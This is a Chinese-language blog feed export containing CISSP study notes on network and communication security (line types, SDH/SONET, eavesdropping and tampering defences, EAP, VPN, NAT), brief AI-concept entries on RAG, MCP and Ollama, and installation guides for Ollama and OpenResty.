链路及长距离连接技术分类</strong></h2><h3 id="专用线路-dedicated-line"><a href="#专用线路-dedicated-line" class="headerlink" title="专用线路 dedicated line"></a>专用线路 dedicated line</h3><p>也称为租用线路，或点对点链路，是一直保留给特定用户使用的线路。</p><p>专用线路一直处于数据传输或等待数据传输的状态。</p><h3 id="非专用线路-nondedicated-line"><a href="#非专用线路-nondedicated-line" class="headerlink" title="非专用线路 nondedicated line"></a>非专用线路 nondedicated line</h3><p>只在需要传输数据时才建立连接。</p><p>使用相同类型的非专用线路的任何远程系统都能通过非专用线路连接起来</p><p><strong>提高承载网络连接的容错能力</strong></p><p>为提高租用线路或载波网络（如帧中继、ATM、SONET、SMDS、X.25等）的容错能力，必须部署两条冗余连接。</p><p>需要从不同的电信运营商或服务提供商购买线路。</p><p>需要确保不同电信运营商或服务提供商的线路没有连接到同一地区的骨干网或共享任何主要干线。</p><h1 id="12-13-光纤链路"><a href="#12-13-光纤链路" class="headerlink" title="12.13 光纤链路"></a>12.13 光纤链路</h1><p>SDN（Synchronous Digital Hierarchy，同步数字系列）和 SONET（Synchronous Optical Network，同步光纤网络）是光纤高速网络标准。</p><p>SDH 是国际电信联盟（ITU）标准。</p><p>SONET 是美国国际标准化研究所（ANSI）标准。</p><p>SDH 和 SONET 主要是硬件和物理层标准。</p><p>SDH 和 SONET 使用同步时分复用（TDM）技术，实现了高速全双工通信，同时降低日常控制和管理需求。</p><p><img src="/../12-%E5%9F%9F4%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E9%80%9A%E4%BF%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20250320083533913.png" alt="image-20250320083533913"></p><p>SDH 和 SONET 同时支持网状及环状拓扑。</p><h1 id="12-14-安全控制特征"><a href="#12-14-安全控制特征" class="headerlink" title="12.14 安全控制特征"></a>12.14 安全控制特征</h1><p><strong>关键特征是对保密性和完整性的保护。通过加密和哈希处理。</strong></p><h2 id="12-14-1-透明性"><a href="#12-14-1-透明性" class="headerlink" title="12.14.1 透明性"></a>12.14.1 透明性</h2><p>透明性（transparency）是服务、安全控制或访问机制的一个特征，确保对用户不可见。</p><p>透明性是安全控制的一项必要特征。</p><p>安全机制越透明越好。</p><h2 id="12-14-2-传输管理机制"><a href="#12-14-2-传输管理机制" class="headerlink" title="12.14.2 传输管理机制"></a>12.14.2 传输管理机制</h2><p>传输日志（transmission logging）是一种专注于通信的审计技术。</p><p>传输日志记录源地址、目的地址、时间戳、识别码、传输状态、报问数量、消息大小等详细信息。</p><p>传输日志用于故障定位、非法通信追踪、系统工作数据提取。</p><p>传输错误纠正（transmission error correction）是面向连接或会话的协议及服务的内置功能。</p><p>传输错误纠正功能要求当信息的整理或部分受到破坏、更改或丢失时，能够向信源发送请求，要求重新发送消息的整体或部分。</p><p>重传控制来确定需要重新传输的是消息的整体还是部分。</p><p>重传控制也用于确定是否多次重复发送哈希值或 CRC（循环冗余校验）值，以及是否使用多数据路径或通信通道。</p><h1 id="12-15-防止或减轻网络攻击"><a href="#12-15-防止或减轻网络攻击" class="headerlink" title="12.15 防止或减轻网络攻击"></a>12.15 防止或减轻网络攻击</h1><p>通信系统安全常见威胁</p><ul><li>拒绝服务</li><li>假冒</li><li>重放</li><li>ARP中毒</li><li>DNS中毒</li><li>窃听</li><li>传输更改</li></ul><h2 id="12-15-1-窃听"><a href="#12-15-1-窃听" class="headerlink" title="12.15.1 窃听"></a>12.15.1 窃听</h2><p>窃听（eavesdropping）是指偷听通信过程，以复制并获取通信内容。</p><p>复制手段：</p><p>将数据录制在存储装置上，或使用提取程序从流量中动态提取原始内容。</p><p>被动攻击：默认的窃听属于被动攻击。</p><p>主动攻击：对通信内容进行更改或注入，则为主动攻击。</p><p>窃听解决方案</p><p>1、确保物理安全，防止非法人员接触 IT 基础设施。</p><p>2、使用加密技术（如 IPsec 或 SSH）和一次性身份认证方法（一次性面板或令牌装置），可以极大地降低窃听效率和时效。</p><h2 id="12-15-2-篡改攻击"><a href="#12-15-2-篡改攻击" class="headerlink" title="12.15.2 篡改攻击"></a>12.15.2 篡改攻击</h2><p>篡改攻击（modification attacks）中，捕获的报文经过修改后又被发送给系统。</p><p><strong>修改报文的主要目的</strong></p><p>为了绕过改进型身份认证机制与会话序列的限制。</p><p><strong>篡改攻击防御措施</strong></p><p>使用数字签名验证及报文校验和验证（如完整性检查）</p><h1 id="12-17-考试要点"><a href="#12-17-考试要点" class="headerlink" title="12.17 考试要点"></a>12.17 考试要点</h1><h2 id="了解-PPP"><a href="#了解-PPP" class="headerlink" title="了解 PPP"></a>了解 PPP</h2><p>点对点协议（PPP）是一种封装协议，旨在支持通过拨号或点对点链路传输 IP 流量。</p><p>最初用于身份认证的 PPP 选项是 PAP、CHAP 和 EAP 。</p><h2 id="PAP、CHAP-和-EAP定义"><a href="#PAP、CHAP-和-EAP定义" class="headerlink" title="PAP、CHAP 和 EAP定义"></a>PAP、CHAP 和 EAP定义</h2><p>PAP 以明文形式传输用户名和密码</p><p>CHAP 使用无法重播的质询-响应对话执行身份认证</p><p>EAP 允许定制身份认证安全解决方案</p><h2 id="能够提供-EAP-的示例"><a href="#能够提供-EAP-的示例" class="headerlink" title="能够提供 EAP 的示例"></a>能够提供 EAP 的示例</h2><p>大约 40 多种 EAP 定义，包括 LEAP、PEAP、EAP-SIM、EAP-FAST、EAP-MD5、EAP-POTP、EAP-TLS 和 EAP-T TLS</p><h2 id="了解-IEEE-802-1X"><a href="#了解-IEEE-802-1X" class="headerlink" title="了解 IEEE 802.1X"></a>了解 IEEE 802.1X</h2><p>IEEE 802.1X 定义了封装 EAP 的使用，以支持 LAN 连接的广泛身份认证选项。</p><p>IEEE 802.1X 标准被正式命名为 “基于端口的网络访问控制”</p><h2 id="了解端口安全性"><a href="#了解端口安全性" class="headerlink" title="了解端口安全性"></a>了解端口安全性</h2><p>端口安全性可以指对所有连接点的物理控制，如 RJ-45 墙壁插孔或设备端口。</p><p>端口安全性是对 TCP 和用户数据报协议（UDP）端口的管理。</p><p>端口安全性还可以指在允许通过端口或跨端口通信之前对端口进行身份认证的需要（即 IEEE 802.1X）</p><h2 id="理解语音通信安全"><a href="#理解语音通信安全" class="headerlink" title="理解语音通信安全"></a>理解语音通信安全</h2><p>语音通信容易受到多种攻击的威胁。</p><p>通过使用加密通信，能够提高保密性。</p><p>需要采取一些技术手段来防止拦截、窃听、tapping 以及其他类型的攻击。</p><p>熟悉与语音通信相关的主题，如 POTS、PSTN、PBX 及 VoIP。</p><h2 id="了解与-PBX-系统有关的威胁以及应对-PBX-欺骗的措施"><a href="#了解与-PBX-系统有关的威胁以及应对-PBX-欺骗的措施" class="headerlink" title="了解与 PBX 系统有关的威胁以及应对 PBX 欺骗的措施"></a>了解与 PBX 系统有关的威胁以及应对 PBX 欺骗的措施</h2><p>抵御 PBX 欺骗与滥用的措施在很大程度上与保护计算机网络的方法相同：逻辑、技术控制、管理控制及物理控制。</p><h2 id="理解与-VoIP-有关的安全问题"><a href="#理解与-VoIP-有关的安全问题" class="headerlink" title="理解与 VoIP 有关的安全问题"></a>理解与 VoIP 有关的安全问题</h2><p>VoIP 面临的安全风险包括：来电显示欺诈、语音钓鱼、拨号管理软件&#x2F;固件攻击、电话硬件攻击、DoS、MITM&#x2F;路径、欺骗及交换机跳跃攻击。</p><h2 id="理解飞客攻击的内容"><a href="#理解飞客攻击的内容" class="headerlink" title="理解飞客攻击的内容"></a>理解飞客攻击的内容</h2><p>飞客攻击（phreaking）是一种特定类型的攻击，此类攻击使用各种技术绕过电话系统的计费功能，以便免费拨打长途电话，更改电话服务的功能，盗用专业化服务或直接导致服务崩溃。</p><p>飞客是执行飞客攻击的人。</p><h2 id="理解远程访问安全管理的问题"><a href="#理解远程访问安全管理的问题" class="headerlink" title="理解远程访问安全管理的问题"></a>理解远程访问安全管理的问题</h2><p>远程访问安全管理要求安全系统设计者按照安全策略、工作任务及加密的要求，来选择硬件与软件组件。</p><h2 id="了解多媒体协作"><a href="#了解多媒体协作" class="headerlink" title="了解多媒体协作"></a>了解多媒体协作</h2><p>多媒体协作是指利用多种多媒体支持通信解决方案来增强远程协作和通信。</p><h2 id="了解负载均衡器的用途"><a href="#了解负载均衡器的用途" class="headerlink" title="了解负载均衡器的用途"></a>了解负载均衡器的用途</h2><p>负载均衡的目的是获得更优化的基础设施利用率，最小化响应时间，最大化吞吐量，减少过载和消除瓶颈。</p><p>负载均衡器用于在多个网络链路或网络设备上分散&#x2F;分配网络负载。</p><h2 id="了解主动-主动系统"><a href="#了解主动-主动系统" class="headerlink" title="了解主动-主动系统"></a>了解主动-主动系统</h2><p>主动-主动系统是一种负载均衡形式，在正常操作期间使用所有可用路径或系统，但在不利条件下容量会降低。</p><h2 id="了解主动-被动系统"><a href="#了解主动-被动系统" class="headerlink" title="了解主动-被动系统"></a>了解主动-被动系统</h2><p>主动-被动系统是一种负载均衡形式，在正常操作期间使某些路径或系统处于未使用的休眠状态，并且能够在异常情况下保持一致的容量。</p><h2 id="理解电子邮件安全的工作机理"><a href="#理解电子邮件安全的工作机理" class="headerlink" title="理解电子邮件安全的工作机理"></a>理解电子邮件安全的工作机理</h2><p>互联网邮件基于 SMTP、POP3 及 IMAP 协议。</p><p>存在固有的不安全性。</p><p>为使邮件变得安全，需要在安全策略中加入一些安全手段。</p><p>解决邮件安全的技术包括：</p><p>S&#x2F;MIME</p><p>PGP</p><p>DKIM</p><p>SPF</p><p>DMARC</p><p>STARTTLS</p><p>隐式 SMTPS</p><h2 id="了解如何保护数据通信"><a href="#了解如何保护数据通信" class="headerlink" title="了解如何保护数据通信"></a>了解如何保护数据通信</h2><p>保护措施应包括实施安全的 VoIP、VPN、VLAN 和 NAT 。</p><h2 id="了解虚拟化网络"><a href="#了解虚拟化网络" class="headerlink" title="了解虚拟化网络"></a>了解虚拟化网络</h2><p>虚拟化网络或网络虚拟化是指将硬件和软件网络组件组成单个集成实体。</p><p>示例包括：</p><p>软件定义网络（SAN）</p><p>VLAN</p><p>VPN</p><p>虚拟交换机</p><p>虚拟 SAN</p><p>来宾操作系统</p><p>端口隔离</p><p>NAT</p><h2 id="定义隧道"><a href="#定义隧道" class="headerlink" title="定义隧道"></a>定义隧道</h2><p>隧道是指用第二种协议封装一种传输协议的消息。</p><p>第二种协议经常利用加密来保护消息内容。</p><h2 id="理解-VPN"><a href="#理解-VPN" class="headerlink" title="理解 VPN"></a>理解 VPN</h2><p>VPN 基于加密隧道。</p><p>能提供具备身份认证及数据保护功能的点对点连接。</p><p>常见的 VPN 协议：</p><p>PPTP</p><p>L2TP</p><p>SSH</p><p>TLS</p><p>IPsec</p><h2 id="了解分割隧道与全隧道"><a href="#了解分割隧道与全隧道" class="headerlink" title="了解分割隧道与全隧道"></a>了解分割隧道与全隧道</h2><p>分割隧道是一种 VPN 配置，允许 VPN 连接的客户端系统（及远程节点）同时通过 VPN 和 互联网直接访问组织网络。</p><p>全隧道是另一种 VPN 配置，客户端的所有流量都通过 VPN 链路发送到组织网络，然后任何以互联网为 目的地 的流量从组织网络的代理或防火墙接口路由到互联网。</p><h2 id="能够解释什么是-NAT"><a href="#能够解释什么是-NAT" class="headerlink" title="能够解释什么是 NAT"></a>能够解释什么是 NAT</h2><p>NAT 为私有网络提供寻址方案，允许使用私有 IP 地址，并支持多个内部用户通过较少的公共 IP 地址来访问互联网。</p><p>很多安全边界都支持 NAT ，如防火墙、路由器、网关、WAP 及代理服务器。</p><h2 id="了解第三方连接"><a href="#了解第三方连接" class="headerlink" title="了解第三方连接"></a>了解第三方连接</h2><p>大多数组织与外部第三方提供商进行交互。</p><p>大部分外部实体不需要直接与组织的 IT&#x2F;IS 进行交互，然而，尽管很少，依然需要考虑风险和后果。包括合作伙伴关系、云服务和远程工作人员。</p><h2 id="理解分组交换与电路交换之间的差异"><a href="#理解分组交换与电路交换之间的差异" class="headerlink" title="理解分组交换与电路交换之间的差异"></a>理解分组交换与电路交换之间的差异</h2><p>电路交换中，通信双方之间建立专用的物理路径。</p><p>分组交换中，消息或通信内容被分成喝多小段，然后通过中间网络传送到目的端。</p><p>分组交换系统中有两种通信路径或虚电路：</p><p>永久虚电路（PVC）</p><p>交换式虚电路（SVC）</p><h2 id="理解各种类型的网络攻击以及与通信安全有关的应对措施"><a href="#理解各种类型的网络攻击以及与通信安全有关的应对措施" class="headerlink" title="理解各种类型的网络攻击以及与通信安全有关的应对措施"></a>理解各种类型的网络攻击以及与通信安全有关的应对措施</h2><p>通信系统容易受到多种攻击的威胁。</p><p>攻击包括：</p><p>分布式拒绝服务攻击（DDoS）</p><p>窃听</p><p>假冒</p><p>重放</p><p>篡改</p><p>欺骗</p><p>ARP 攻击</p><p>DNS攻击</p><p>要能针对每种攻击提出有效的应对措施。</p><h1 id="12-18-薄弱点"><a href="#12-18-薄弱点" class="headerlink" title="12.18 薄弱点"></a>12.18 薄弱点</h1><p>EAP</p><p>PBX</p><p>飞客</p><p>多媒体</p><p>VPN</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ai-ComfyUI</title>
    <link href="/2025/02/26/security/aisec/ai-ComfyUI/"/>
    <url>/2025/02/26/security/aisec/ai-ComfyUI/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>aisec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>aisec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ai-Ollma</title>
    <link href="/2025/02/26/security/aisec/ai-Ollma/"/>
    <url>/2025/02/26/security/aisec/ai-Ollma/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h2 id="Linux部署"><a href="#Linux部署" class="headerlink" title="Linux部署"></a>Linux部署</h2><h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">curl -fsSL https://ollama.<span class="hljs-keyword">com</span>/install.<span class="hljs-keyword">sh</span> | <span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs clean">[root@localhost ai]# curl -fsSL https:<span class="hljs-comment">//ollama.com/install.sh | sh</span><br>&gt;&gt;&gt; Cleaning up old version at /usr/lib/ollama<br>&gt;&gt;&gt; Installing ollama to /usr<br>&gt;&gt;&gt; Downloading Linux amd64 bundle<br>######################################################################## <span class="hljs-number">100.0</span>%<br>&gt;&gt;&gt; Creating ollama user...<br>&gt;&gt;&gt; Adding ollama user to video group...<br>&gt;&gt;&gt; Adding current user to ollama group...<br>&gt;&gt;&gt; Creating ollama systemd service...<br>&gt;&gt;&gt; Enabling and starting ollama service...<br>Created symlink <span class="hljs-keyword">from</span> /etc/systemd/<span class="hljs-keyword">system</span>/default.target.wants/ollama.service to /etc/systemd/<span class="hljs-keyword">system</span>/ollama.service.<br>&gt;&gt;&gt; The Ollama API is now available at <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">11434.</span><br>&gt;&gt;&gt; Install complete. Run <span class="hljs-string">&quot;ollama&quot;</span> <span class="hljs-keyword">from</span> the command line.<br>WARNING: No NVIDIA/AMD GPU detected. Ollama will run <span class="hljs-keyword">in</span> CPU-only mode.<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>aisec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>aisec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ai-base</title>
    <link href="/2025/02/26/security/aisec/ai-base/"/>
    <url>/2025/02/26/security/aisec/ai-base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="常见概念"><a href="#常见概念" class="headerlink" title="常见概念"></a>常见概念</h1><h2 id="RAG（检索增强生成）"><a href="#RAG（检索增强生成）" class="headerlink" title="RAG（检索增强生成）"></a>RAG（检索增强生成）</h2><p>上下文信息检索方法，利用基于向量的搜索从数据库或知识库中检索相关知识，使模型能够补充最新的信息。</p><h2 id="Function-Call"><a href="#Function-Call" class="headerlink" title="Function Call"></a>Function Call</h2><h2 id="MCP-协议"><a href="#MCP-协议" class="headerlink" title="MCP 协议"></a>MCP 协议</h2><p>Anthropic 发布</p><p>Model Context Protocol 模型上下文协议</p><p><strong>旨在统一规范大语言模型与外部数据源和工具之间的通信</strong>，建立 AI  与外部数据、工具交互的标准，类似中间件</p><h3 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h3><h4 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h4><p>本地运行的 AI 应用环境。</p><h4 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h4><p>MCP 客户端，在主机和 MCP Server 中保持连接，例如：Claude 客户端、Cline等应用程序都内置 MCP Client 客户端。</p><h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><p>MCP 插件所对应的服务端。</p><h4 id="通信流程"><a href="#通信流程" class="headerlink" title="通信流程"></a>通信流程</h4><p>用户 -&gt;  Host -&gt; Client -&gt; Server</p><h2 id="A2A"><a href="#A2A" class="headerlink" title="A2A"></a>A2A</h2><p>Google 发布</p><p>Agent2Agent 协议，促进 AI Agent之间的通信协作</p><p>A2A负责解决Agent间的通信问题，MCP解决的是Agent与工具间的通信问题。</p><h2 id="Ollama"><a href="#Ollama" class="headerlink" title="Ollama"></a>Ollama</h2><p><strong>Ollama</strong> 是一个用于在本地运行、管理和与大型语言模型（LLMs）交互的开源工具。它旨在简化 LLMs 的部署和使用，特别适合开发者和研究人员在本地环境中快速测试和运行 AI 模型。</p><p><a href="https://github.com/ollama/ollama">https://github.com/ollama/ollama</a></p><p><a href="https://ollama.com/">https://ollama.com/</a></p><h2 id="Open-WebUI"><a href="#Open-WebUI" class="headerlink" title="Open WebUI"></a>Open WebUI</h2><p><strong>Open WebUI is an <a href="https://docs.openwebui.com/features/plugin/">extensible</a>, feature-rich, and user-friendly self-hosted AI platform designed to operate entirely offline.</strong> It supports various LLM runners like <strong>Ollama</strong> and <strong>OpenAI-compatible APIs</strong>, with <strong>built-in inference engine</strong> for RAG, making it a <strong>powerful AI deployment solution</strong>.</p><p>Open WebUI 是一个可扩展、功能丰富且用户友好的自托管 AI 平台，设计为完全离线运行。它支持诸如 Ollama 和兼容 OpenAI 的 API 等多种 LLM 运行器，并内置了用于 RAG 的推理引擎，使其成为强大的 AI 部署解决方案。</p><p><a href="https://docs.openwebui.com/">https://docs.openwebui.com/</a></p><h2 id="LM-Studio"><a href="#LM-Studio" class="headerlink" title="LM Studio"></a>LM Studio</h2><p>LM Studio is a desktop app for developing and experimenting with LLMs locally on your computer.</p><p>LM Studio 是一款桌面应用程序，可在您的计算机上本地开发和试验大型语言模型。</p><p><a href="https://lmstudio.ai/">https://lmstudio.ai/</a></p><h1 id="常见术语"><a href="#常见术语" class="headerlink" title="常见术语"></a>常见术语</h1><h2 id="NLP"><a href="#NLP" class="headerlink" title="NLP"></a>NLP</h2><p>自然语言处理</p><h2 id="LLMs"><a href="#LLMs" class="headerlink" title="LLMs"></a>LLMs</h2><p>大型语言模型</p><h2 id="Xb"><a href="#Xb" class="headerlink" title="Xb"></a>Xb</h2><p>模型参数量</p><p>x billion，7b 为 7 billion，也就是 70 亿个</p><p>参数量是模型中可训练的权重参数总数，</p><h1 id="风险端口"><a href="#风险端口" class="headerlink" title="风险端口"></a>风险端口</h1><h2 id="11434-Ollama"><a href="#11434-Ollama" class="headerlink" title="11434 Ollama"></a>11434 Ollama</h2><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h3 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h3><p>建议在 Python 虚拟环境中安装依赖项，以避免与系统 Python 环境冲突</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m venv deepseek_env<br><span class="hljs-built_in">source</span> deepseek_env/bin/activate<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>aisec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>aisec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>openresty_base</title>
    <link href="/2025/02/25/yunwei/applications/openresty/openresty_base/"/>
    <url>/2025/02/25/yunwei/applications/openresty/openresty_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p>OpenResty 是一个基于 Nginx 和 LuaJIT 的高性能 Web 平台，支持 Lua 脚本扩展。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> yum install -y epel-release<br><span class="hljs-built_in">sudo</span> yum install -y gcc pcre pcre-devel openssl openssl-devel zlib zlib-devel perl make<br></code></pre></td></tr></table></figure><h3 id="下载-OpenResty-源码"><a href="#下载-OpenResty-源码" class="headerlink" title="下载 OpenResty 源码"></a>下载 OpenResty 源码</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>openresty.org<span class="hljs-regexp">/download/</span>openresty-<span class="hljs-number">1.25</span>.<span class="hljs-number">3.1</span>.tar.gz<br></code></pre></td></tr></table></figure><h3 id="编译和安装"><a href="#编译和安装" class="headerlink" title="编译和安装"></a>编译和安装</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tar</span> -zxvf openresty-<span class="hljs-number">1.25.3.1</span>.tar.gz<br>cd openresty-<span class="hljs-number">1.25.3.1</span><br></code></pre></td></tr></table></figure><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livescript">./configure --prefix=/usr/local/openresty <span class="hljs-string">\</span><br>            --<span class="hljs-keyword">with</span>-http_ssl_module <span class="hljs-string">\</span><br>            --<span class="hljs-keyword">with</span>-http_v2_module <span class="hljs-string">\</span><br>            --<span class="hljs-keyword">with</span>-http_realip_module <span class="hljs-string">\</span><br>            --<span class="hljs-keyword">with</span>-http_stub_status_module <span class="hljs-string">\</span><br>            --<span class="hljs-keyword">with</span>-http_gzip_static_module <span class="hljs-string">\</span><br>            --<span class="hljs-keyword">with</span>-pcre-jit <span class="hljs-string">\</span><br>            --<span class="hljs-keyword">with</span>-threads <span class="hljs-string">\</span><br>            --<span class="hljs-keyword">with</span>-file-aio <span class="hljs-string">\</span><br>            --<span class="hljs-keyword">with</span>-compat<br><br>make -j$(nproc)<br>sudo make install<br></code></pre></td></tr></table></figure><p><code>--prefix=/usr/local/openresty</code>：指定安装目录</p><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;export PATH=/usr/local/openresty/nginx/sbin:$PATH&#x27;</span> &gt;&gt; ~/.bashrc<br><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><h3 id="启动-OpenResty"><a href="#启动-OpenResty" class="headerlink" title="启动 OpenResty"></a>启动 OpenResty</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/openresty/</span>nginx<span class="hljs-regexp">/sbin/</span>nginx<br></code></pre></td></tr></table></figure><h3 id="设置开机自启动"><a href="#设置开机自启动" class="headerlink" title="设置开机自启动"></a>设置开机自启动</h3><p>创建 Systemd 服务文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo vi <span class="hljs-regexp">/etc/</span>systemd<span class="hljs-regexp">/system/</span>openresty.service<br></code></pre></td></tr></table></figure><p>添加以下内容:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=OpenResty HTTP Server<br><span class="hljs-attr">After</span>=network.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=forking<br><span class="hljs-attr">PIDFile</span>=/usr/local/openresty/nginx/logs/nginx.pid<br><span class="hljs-attr">ExecStart</span>=/usr/local/openresty/nginx/sbin/nginx<br><span class="hljs-attr">ExecReload</span>=/usr/local/openresty/nginx/sbin/nginx -s reload<br><span class="hljs-attr">ExecStop</span>=/usr/local/openresty/nginx/sbin/nginx -s quit<br><span class="hljs-attr">PrivateTmp</span>=<span class="hljs-literal">true</span><br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><h3 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nginx -V</span><br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">[root@ site]<span class="hljs-comment"># nginx -V</span><br>nginx <span class="hljs-keyword">version</span>: openresty/1.25.3.1<br>built by gcc 4.8.5 20150623 <span class="hljs-params">(Red Hat 4.8.5-44)</span> <span class="hljs-params">(GCC)</span><br>built with OpenSSL 1.0.2k-fips  26 Jan 2017<br>TLS SNI support enabled<br>configure arguments: <span class="hljs-params">--prefix=/usr/local/openresty/nginx</span> <span class="hljs-params">--with-cc-opt=-O2</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../ngx_devel_kit-0.3.3</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../echo-nginx-module-0.63</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../xss-nginx-module-0.06</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../ngx_coolkit-0.2</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../set-misc-nginx-module-0.33</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../form-input-nginx-module-0.12</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../encrypted-session-nginx-module-0.09</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../srcache-nginx-module-0.33</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../ngx_lua-0.10.26</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../ngx_lua_upstream-0.07</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../headers-more-nginx-module-0.37</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../array-var-nginx-module-0.06</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../memc-nginx-module-0.20</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../redis2-nginx-module-0.15</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../redis-nginx-module-0.3.9</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../rds-json-nginx-module-0.16</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../rds-csv-nginx-module-0.09</span> <span class="hljs-params">--add-module=</span><span class="hljs-string">../ngx_stream_lua-0.0.14</span> <span class="hljs-params">--with-ld-opt=-Wl</span>,-rpath,<span class="hljs-string">/usr/local/openresty/luajit/lib</span> <span class="hljs-params">--with-http_ssl_module</span> <span class="hljs-params">--with-http_v2_module</span> <span 